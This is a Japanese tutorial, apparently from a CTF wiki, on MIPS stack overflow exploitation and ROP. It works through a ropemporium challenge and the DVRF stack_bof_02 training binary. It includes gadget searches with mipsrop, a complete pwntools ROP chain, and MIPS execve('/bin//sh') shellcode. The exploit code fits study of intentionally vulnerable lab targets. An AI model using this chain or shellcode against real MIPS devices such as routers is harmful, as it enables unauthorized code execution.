# mips - ROP
## はじめに
この章では現時点では mips の rop のみを紹介します。その他の脆弱性の悪用については今後順次紹介していきます。
## 予備知識
アーキテクチャの復習は次を参照してください: https://ctf-wiki.github.io/ctf-wiki/assembly/mips/readme-zh/
スタック構造は図のとおりです。
![img](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image001.gif)
いくつか特に注意すべき点があります。

1. MIPS32 アーキテクチャには EBP レジスタがありません。関数を呼び出すときは、現在のスタックポインタを n ビット分だけ下に動かして、その関数の stack frame の格納領域とし、関数がリターンするときにオフセットを加え戻してスタックを復元します。
2. 引数の受け渡しでは、最初の4つの引数は $a0-$a3 で渡され、それを超える分は、呼び出し元があらかじめ確保したスタック上部の領域に保存されます。
3. MIPS が関数を呼び出すときは、関数のリターンアドレスを直接 $RA レジスタに格納します。
## 簡単な環境の準備
ここではユーザーモードでプログラムをデバッグするので、qemu-user などの依存パッケージをインストールする必要があります。
```bash
$ sudo apt install qemu-user
$ sudo apt install libc6-mipsel-cross
$ sudo mkdir /etc/qemu-binfmt
$ sudo ln -s /usr/mipsel-linux-gnu /etc/qemu-binfmt/mipsel
```
## 問題
### 1 ropemporium ret2text
pwnme 関数の中を追います。
![image-20201028010553089](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201028010554.png)
関数の冒頭で、ra レジスタの値が $sp+60 の位置に格納されているのが分かります。つまりリターンアドレスは $sp+60 にあります。
![image-20201028011257573](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201028011258.png)
さらにこの関数内の read を見ると、a2 は読み込むサイズで 0x38 が代入され、buf は $sp + 0x18 の位置にあります。明らかにスタックオーバーフローの脆弱性があり、リターンアドレスを上書きできます。
計算により、padding は 36 と求められます。

```
60 - 0x18 = 36 
```
このほか、プログラムには ret2win 関数があります。
![image-20201028011734928](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201028011736.png)
そのため、この問題ではリターンアドレスを ret2win 関数のアドレスで上書きするだけでかまいません。そこで、次のような payload を構築できます。
```python
pay = 'A'*36 + p32(ret2win_addr)
```
これで get flag できます。
![image-20201028012453672](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201028012455.png)
### 2 DVRF stack_bof_02.c
問題のソースコードは次のとおりです。
```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

//Simple BoF by b1ack0wl for E1550
//Shellcode is Required


int main(int argc, char **argv[]){
char buf[500] ="\0";

if (argc < 2){
printf("Usage: stack_bof_01 <argument>\r\n-By b1ack0wl\r\n");
exit(1);
} 


printf("Welcome to the Second BoF exercise! You'll need Shellcode for this! ;)\r\n\r\n"); 
strcpy(buf, argv[1]);

printf("You entered %s \r\n", buf);
printf("Try Again\r\n");

return 0;
}
```
クロスコンパイルツールをインストールします。
```bash
sudo apt-get update
sudo apt-get install binutils-mipsel-linux-gnu
sudo apt-get install gcc-mipsel-linux-gnu
```
上のソースコードをコンパイルします。
```bash
mipsel-linux-gnu-gcc -fno-stack-protector stack_bof_02.c -o stack_bof_02
```
プログラムの保護機構
![image-20201028025116416](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201028025118.png)
コードのロジックは単純で、strcpy の箇所にスタックオーバーフローがあります。

> プログラムのデバッグ
`qemu-mipsel-static -g 1234 -L ./mipsel ./vuln_system  PAYLOAD`
-g はデバッグポートを指定し、-L は lib などのファイルのディレクトリを指定します。プログラムが起動したら、
`gdb-multiarch stack_bof_02` を実行し、gdb の中で `target remote 127.0.0.1:1234` を実行すればデバッガをアタッチできます。
![image-20201028032102193](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201028032104.png)
> PC の制御
![image-20201028030936453](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201028030938.png)
リターンアドレスは $sp+532 にあり、buf は $fp+24 にあります。
つまり padding は `pay += b'a'*508` です。
```python
# padding :532 - 24 = 508
from pwn import *

context.log_level = 'debug'

pay =  b''
pay += b'a'*508
pay += b'b'*4

# with open('payload','wb') as f:
#     f.write(pay)

p = process(['qemu-mipsel-static', '-L', './mipsel', '-g', '1234','./stack_bof_02', pay])
# p = process(['qemu-mipsel-static', '-L', './mipsel', './stack_bof_02'])
pause()
p.interactive()
```
次の図のように、ra レジスタを制御でき、ひいては PC を制御できます。
![image-20201028031118603](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201028031120.png)
> gadget を探して ret2shellcode を行う
プログラムには PIE などの保護が有効になっていないため、スタック上に直接 shellcode を注入し、PC を制御してスタックへジャンプさせることができます。

gadget を探すには、IDA プラグインの mipsrop.py を使います。

mips はパイプライン方式の命令セットで cache incoherency(キャッシュの不整合)という特性があるため、データ領域を現在の命令領域にフラッシュするために sleep などの関数を呼び出す必要があります。そうしないと shellcode を正常に実行できません。より多くの gadget を探すため、またこれは demo でもあるので、libc の中から探します。
#### 1. sleep 関数の呼び出し
sleep 関数を呼び出す前に、まず a0 を設定する gadget を探す必要があります。
```
Python>mipsrop.find("li $a0, 1")
----------------------------------------------------------------------------------------------------------------
|  Address     |  Action                                              |  Control Jump                          |
----------------------------------------------------------------------------------------------------------------
|  0x000B9350  |  li $a0,1                                            |  jalr  $s2                             |
|  0x000E2660  |  li $a0,1                                            |  jalr  $s2                             |
|  0x00109918  |  li $a0,1                                            |  jalr  $s1                             |
|  0x0010E604  |  li $a0,1                                            |  jalr  $s2                             |
|  0x0012D650  |  li $a0,1                                            |  jalr  $s0                             |
|  0x0012D658  |  li $a0,1                                            |  jalr  $s2                             |
|  0x00034C5C  |  li $a0,1                                            |  jr    0x18+var_s4($sp)                |
|  0x00080100  |  li $a0,1                                            |  jr    0x18+var_s4($sp)                |
|  0x00088E80  |  li $a0,1                                            |  jr    0x1C+var_s0($sp)                |
|  0x00091134  |  li $a0,1                                            |  jr    0x70+var_s24($sp)               |
|  0x00091BB0  |  li $a0,1                                            |  jr    0x70+var_s24($sp)               |
|  0x000D5460  |  li $a0,1                                            |  jr    0x1C+var_s10($sp)               |
|  0x000F2A80  |  li $a0,1                                            |  jr    0x1C+var_s0($sp)                |
|  0x001251C0  |  li $a0,1                                            |  jr    0x18+var_s14($sp)               |
----------------------------------------------------------------------------------------------------------------
Found 14 matching gadgets
```

ここでは 0x00E2660 にある gadget を選びました。

```
.text:000E2660                 move    $t9, $s2
.text:000E2664                 jalr    $t9 ; sigprocmask
.text:000E2668                 li      $a0, 1
```

この gadget は最後に s2 レジスタの値が指す位置にジャンプすることが分かります。そのため、次は s2 を制御できる gadget を探す必要があります。

通常はここで mipsrop プラグインの `mipsrop.tail()` メソッドを使い、スタックからレジスタを設定する gadget を探します。

```
Python>mipsrop.tail()
----------------------------------------------------------------------------------------------------------------
|  Address     |  Action                                              |  Control Jump                          |
----------------------------------------------------------------------------------------------------------------
|  0x0001E598  |  move $t9,$s2                                        |  jr    $s2                             |
|  0x000F7758  |  move $t9,$s1                                        |  jr    $s1                             |
|  0x000F776C  |  move $t9,$s1                                        |  jr    $s1                             |
|  0x000F7868  |  move $t9,$s1                                        |  jr    $s1                             |
|  0x000F787C  |  move $t9,$s1                                        |  jr    $s1                             |
|  0x000F86D4  |  move $t9,$s4                                        |  jr    $s4                             |
|  0x000F8794  |  move $t9,$s5                                        |  jr    $s5                             |
|  0x00127E6C  |  move $t9,$s0                                        |  jr    $s0                             |
|  0x0012A80C  |  move $t9,$s0                                        |  jr    $s0                             |
|  0x0012A880  |  move $t9,$s0                                        |  jr    $s0                             |
|  0x0012F4A8  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x0013032C  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x00130344  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x00132C58  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x00133888  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x0013733C  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x00137354  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x00137CDC  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x00137CF4  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x00139BFC  |  move $t9,$s4                                        |  jr    $s4                             |
----------------------------------------------------------------------------------------------------------------
Found 20 matching gadgets
```
適切なものがなければ、"*dir" 系の関数の末尾から探してみることもできます。たとえば readdir64 関数の末尾に次の gadget を見つけました。
![image-20201029161619764](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20201029161619764.png)

これで s2 レジスタと PC を制御できるようになりました。次は sleep にジャンプしますが、単に sleep にジャンプするだけでは不十分です。sleep の実行後に次の gadget へ飛べるようにする必要があるため、sleep を実行でき、かつ次の PC アドレスも制御できる gadget がもう一つ必要です。
レジスタを見ると、この時点で制御できるものがかなり多いので、ここでは $a3 のレジスタを探してみます。
```
Python>mipsrop.find("mov $t9, $s3")
----------------------------------------------------------------------------------------------------------------
|  Address     |  Action                                              |  Control Jump                          |
----------------------------------------------------------------------------------------------------------------
|  0x0001CE80  |  move $t9,$s3                                        |  jalr  $s3                             |
..........
|  0x000949EC  |  move $t9,$s3                                        |  jalr  $s3                             |
....
```
この gadget を使って、まず s3 レジスタの指す先にジャンプして sleep を実行し、その後、制御した ra レジスタで次の処理に進みます。


```
.text:000949EC                 move    $t9, $s3
.text:000949F0                 jalr    $t9 ; uselocale
.text:000949F4                 move    $s0, $v0
.text:000949F8
.text:000949F8 loc_949F8:                               # CODE XREF: strerror_l+15C↓j
.text:000949F8                 lw      $ra, 0x34($sp)
.text:000949FC                 move    $v0, $s0
.text:00094A00                 lw      $s3, 0x24+var_sC($sp)
.text:00094A04                 lw      $s2, 0x24+var_s8($sp)
.text:00094A08                 lw      $s1, 0x24+var_s4($sp)
.text:00094A0C                 lw      $s0, 0x24+var_s0($sp)
.text:00094A10                 jr      $ra
.text:00094A14                 addiu   $sp, 0x38
```
この gadget を使って、まず s3 レジスタの指す先にジャンプして sleep を実行し、その後、制御した ra レジスタで次の処理に進みます。
#### 2. shellcode へのジャンプ

次は shellcode にジャンプします。shellcode にジャンプするには、まずスタックアドレスを取得する必要があります。

まず `Python>mipsrop.stackfinder()` を使います。

すると次の gadget が得られます。

  ```asm
  .text:00095B74                 addiu   $a1, $sp, 52
  .text:00095B78                 sw      $zero, 24($sp)
  .text:00095B7C                 sw      $v0, 20($sp)
  .text:00095B80                 move    $a3, $s2
  .text:00095B84                 move    $t9, $s5
  .text:00095B88                 jalr    $t9
  ```
この gadget は、スタックアドレス、つまり $sp+24 の値を $a0 に代入できます。このスタックが、これから shellcode を埋め込む場所になります。$s5 は制御可能で、この gadget は最後に $s5 にジャンプするので、あとは $a0 に直接 jr する gadget をもう一つ見つければよいことになります。
```
  Python>mipsrop.find("move $t9, $a1")
  ----------------------------------------------------------------------------------------------------------------
  |  Address     |  Action                                              |  Control Jump                          |
  ----------------------------------------------------------------------------------------------------------------
  |  0x000FA0A0  |  move $t9,$a1                                        |  jalr  $a1                             |
  |  0x0012568C  |  move $t9,$a1                                        |  jalr  $a1                             |
  |  0x0012F4A8  |  move $t9,$a1                                        |  jr    $a1                             |
  |  0x0013032C  |  move $t9,$a1                                        |  jr    $a1                             |
  |  0x00130344  |  move $t9,$a1                                        |  jr    $a1                             |
  |  0x00132C58  |  move $t9,$a1                                        |  jr    $a1                             |
  |  0x00133888  |  move $t9,$a1                                        |  jr    $a1                             |
  |  0x0013733C  |  move $t9,$a1                                        |  jr    $a1                             |
  |  0x00137354  |  move $t9,$a1                                        |  jr    $a1                             |
  |  0x00137CDC  |  move $t9,$a1                                        |  jr    $a1                             |
  |  0x00137CF4  |  move $t9,$a1                                        |  jr    $a1                             |
  ----------------------------------------------------------------------------------------------------------------
  Found 11 matching gadgets
```
ここで使うのは次の gadget です。
```
  .text:0012568C                 move    $t9, $a1
  .text:00125690                 move    $a3, $v0
  .text:00125694                 move    $a1, $a0
  .text:00125698                 jalr    $t9
```
最後の exploit

```python
from pwn import *
# context.log_level = 'debug'
  
libc_base = 0x7f61f000
set_a0_addr = 0xE2660
#.text:000E2660                 move    $t9, $s2
#.text:000E2664                 jalr    $t9 ; sigprocmask
#.text:000E2668                 li      $a0, 1
set_s2_addr = 0xB2EE8
#.text:000B2EE8                 lw      $ra, 52($sp)
#.text:000B2EF0                 lw      $s6, 48($sp)
#.text:000B2EF4                 lw      $s5, 44($sp)
#.text:000B2EF8                 lw      $s4, 40($sp)
#.text:000B2EFC                 lw      $s3, 36($sp)
#.text:000B2F00                 lw      $s2, 32($sp)
#.text:000B2F04                 lw      $s1, 28($sp)
#.text:000B2F08                 lw      $s0, 24($sp)
#.text:000B2F0C                 jr      $ra
jr_t9_jr_ra = 0x949EC
# .text:000949EC                 move    $t9, $s3
# .text:000949F0                 jalr    $t9 ; uselocale
# .text:000949F4                 move    $s0, $v0
# .text:000949F8
# .text:000949F8 loc_949F8:                               # CODE XREF: strerror_l+15C↓j
# .text:000949F8                 lw      $ra, 0x34($sp)
# .text:000949FC                 move    $v0, $s0
# .text:00094A00                 lw      $s3, 0x24+var_sC($sp)
# .text:00094A04                 lw      $s2, 0x24+var_s8($sp)
# .text:00094A08                 lw      $s1, 0x24+var_s4($sp)
# .text:00094A0C                 lw      $s0, 0x24+var_s0($sp)
# .text:00094A10                 jr      $ra
addiu_a1_sp = 0x95B74
# .text:00095B74                 addiu   $a1, $sp, 52
# .text:00095B78                 sw      $zero, 24($sp)
# .text:00095B7C                 sw      $v0, 20($sp)
# .text:00095B80                 move    $a3, $s2
# .text:00095B84                 move    $t9, $s5
# .text:00095B88                 jalr    $t9
jr_a1 = 0x12568C
# .text:0012568C                 move    $t9, $a1
# .text:00125690                 move    $a3, $v0
# .text:00125694                 move    $a1, $a0
# .text:00125698                 jalr    $t9
sleep = 0xB8FC0

shellcode  = b""
shellcode += b"\xff\xff\x06\x28"  # slti $a2, $zero, -1
shellcode += b"\x62\x69\x0f\x3c"  # lui $t7, 0x6962
shellcode += b"\x2f\x2f\xef\x35"  # ori $t7, $t7, 0x2f2f
shellcode += b"\xf4\xff\xaf\xaf"  # sw $t7, -0xc($sp)
shellcode += b"\x73\x68\x0e\x3c"  # lui $t6, 0x6873
shellcode += b"\x6e\x2f\xce\x35"  # ori $t6, $t6, 0x2f6e
shellcode += b"\xf8\xff\xae\xaf"  # sw $t6, -8($sp)
shellcode += b"\xfc\xff\xa0\xaf"  # sw $zero, -4($sp)
shellcode += b"\xf4\xff\xa4\x27"  # addiu $a0, $sp, -0xc
shellcode += b"\xff\xff\x05\x28"  # slti $a1, $zero, -1
shellcode += b"\xab\x0f\x02\x24"  # addiu;$v0, $zero, 0xfab
shellcode += b"\x0c\x01\x01\x01"  # syscall 0x40404

pay =  b''
pay += b'a'*508
pay += p32(set_s2_addr+libc_base)
pay += b'b'*24
pay += b'1111'                    #s0
pay += b'2222'                    #s1
pay += p32(jr_t9_jr_ra+libc_base) #s2 - > set a0 
pay += p32(sleep+libc_base)       #s3
pay += b'5555'                    #s4
pay += p32(jr_a1+libc_base)     #s5
pay += b'7777'                    #s6
pay += p32(set_a0_addr+libc_base)
pay += b'c'*0x34
pay += p32(addiu_a1_sp+libc_base)
pay += b'd'*52
pay += shellcode

log.info(hex(0x94A10+libc_base))
log.info('addiu_a0_sp_24: {}'.format(hex(addiu_a1_sp+libc_base)))
with open('payload','wb') as f:
    f.write(pay)
# p = process(['qemu-mipsel-static', '-L', './mipsel', '-g', '1234','./stack_bof_02', pay])
p = process(['qemu-mipsel-static', '-L', './mipsel', './stack_bof_02',pay])
pause()
p.interactive()
```

